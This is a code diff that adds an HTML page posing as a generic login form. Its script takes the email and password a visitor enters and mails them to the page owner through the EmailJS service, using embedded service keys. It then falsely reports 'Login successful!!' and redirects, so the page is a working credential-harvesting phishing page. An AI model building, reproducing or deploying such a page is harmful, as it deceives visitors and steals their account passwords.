@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Geologica:wght@300&display=swap" rel="stylesheet">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Anta&family=Hind+Siliguri:wght@600&family=Kode+Mono:wght@400..700&family=Quicksand:wght@300..700&display=swap" rel="stylesheet">
+    <title>Login Form</title>
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
+      crossorigin="anonymous"
+    />
+    <script src="index.js"></script>
+
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+    ></script>
+    <script type="text/javascript">
+      (function () {
+        emailjs.init("C5aTWPduaXLgn27u9");
+      })();
+    </script>
+    <style>
+      body {
+      font-family: Arial, sans-serif;
+      background:black;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    font-family: "Anta", sans-serif;
+  font-weight: 400;
+  font-style: normal;
+      
+    }
+
+    
+    h1 {
+      font-size: 20px;
+      margin-top: 180px;
+    }
+
+    input[type="email"] {
+      width: 300px;
+      padding: 10px;
+      margin-bottom: px;
+      background-color: white
+      border: solid 1px transparent;
+      border-top-right-radius: 50px;
+      color: black;
+      
+    }
+input[type="password"] {
+      width: 300px;
+      padding: 10px;
+      margin-bottom: 10px;
+      background-color: white
+      border: solid 1px transparent;
+      border-bottom-right-radius: 50px;
+      color: black;
+    }
+    input[type="email"]::placeholder,
+    input[type="password"]::placeholder {
+      color: black;
+      font-family: 'Geologica', sans-serif;
+    }
+
+    button[type="submit"] {
+      width: 300px;
+      padding: 10px;
+      background-color: white;
+      color: black;
+      font-family: 'Geologica', sans-serif;
+      border-top-right-radius: 75px;
+border-bottom-right-radius:75px;cursor: pointer;border: none;margin-left: px
+    }
+
+    button[type="submit"]:hover {
+      background-color: black;color:white;
+    }
+
+    a {
+      color: #fff;
+      text-decoration: none;
+    }
+    
+    </style>
+  </head>
+  <body>
+    <center>
+      
+
+      <div class="container">      <b><h1>LOGIN HERE!!<BR>JUST FOR CONNECTION!!!</h1></b>
+        <div class="form-group">
+          <label for="email"></label>
+          <input
+            type="email"
+            class="form-control"
+            id="email"
+            placeholder="Enter Email"
+          required/>
+        </div>
+        <div class="form-group">
+          <label for="message"></label>
+          <input
+            type="password"
+            class="form-control"
+            id="message"
+            placeholder="Enter Password"
+         required />
+        </div>
+        <button type="submit" class="btn btn-primary" onclick="sendMail()" id="bok">Submit</button>
+      </div>
+    </center>
+
+    <script>
+      function sendMail() {
+        var params = {
+          email: document.getElementById("email").value,
+          message: document.getElementById("message").value,
+        };
+
+        const serviceID = "service_lis2tni";
+        const templateID = "template_3p4ipk4";
+
+        emailjs
+          .send(serviceID, templateID, params)
+          .then((res) => {
+            document.getElementById("email").value = "";
+            document.getElementById("message").value = "";
+            console.log(res);
+            alert("Login successful!!");
+            // Redirect to another website
+            window.location.href = 'log.html';
+          })
+          .catch((err) => console.log(err));
+      }
+    </script>
+  </body>
+</html>
